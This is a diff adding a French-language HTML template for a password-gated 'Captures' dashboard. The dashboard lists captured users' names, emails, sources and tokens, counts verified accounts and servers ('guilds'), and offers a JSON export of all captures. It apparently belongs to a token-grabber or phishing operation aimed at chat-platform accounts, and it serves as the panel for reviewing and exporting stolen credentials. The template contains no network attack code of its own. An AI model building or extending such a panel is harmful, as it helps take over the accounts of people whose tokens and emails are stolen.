@@ -1,0 +1,64 @@
+{% extends "base.html" %}
+{% block title %}Dashboard - Captures{% endblock %}
+{% block body %}
+<main class="shell wide">
+
+  {% if not authed %}
+  <section class="card narrow center">
+    <div class="brand">
+      <span class="brand-mark">V</span>
+      <span class="brand-name">Dashboard</span>
+    </div>
+    <h1>Connexion</h1>
+    <p class="muted">Entre le mot de passe d'administration.</p>
+    <input id="password" type="password" placeholder="Mot de passe" autocomplete="current-password">
+    <button class="btn primary wide" id="login">Se connecter</button>
+    <p class="tiny" id="login-error"></p>
+  </section>
+  {% else %}
+  <header class="topbar">
+    <div class="brand">
+      <span class="brand-mark">V</span>
+      <span class="brand-name">Captures</span>
+    </div>
+    <div class="topbar-actions">
+      <input id="search" type="search" placeholder="Rechercher (pseudo, email, id)">
+      <button class="btn ghost" id="refresh">Rafraichir</button>
+      <a class="btn ghost" href="/api/export" download="captures.json">Export JSON</a>
+      <button class="btn ghost" id="logout">Deconnexion</button>
+    </div>
+  </header>
+
+  <section class="grid" id="stats">
+    <div class="stat"><span class="stat-value" data-stat="captures">-</span><span class="stat-label">Captures</span></div>
+    <div class="stat"><span class="stat-value" data-stat="unique_users">-</span><span class="stat-label">Comptes uniques</span></div>
+    <div class="stat"><span class="stat-value" data-stat="last24">-</span><span class="stat-label">Dernieres 24h</span></div>
+    <div class="stat"><span class="stat-value" data-stat="verified">-</span><span class="stat-label">Verifies</span></div>
+    <div class="stat"><span class="stat-value" data-stat="guilds">-</span><span class="stat-label">Serveurs</span></div>
+  </section>
+
+  <section class="card table-card">
+    <table id="table">
+      <thead>
+        <tr>
+          <th>Date</th>
+          <th>Utilisateur</th>
+          <th>Email</th>
+          <th>Source</th>
+          <th>Token</th>
+          <th>Etat</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody id="rows"></tbody>
+    </table>
+    <p class="tiny" id="empty" hidden>Aucune capture pour le moment.</p>
+  </section>
+  {% endif %}
+
+</main>
+{% endblock %}
+{% block scripts %}
+<script>window.__BASE_URL__ = {{ base_url | tojson }};</script>
+<script src="/static/dashboard.js"></script>
+{% endblock %}
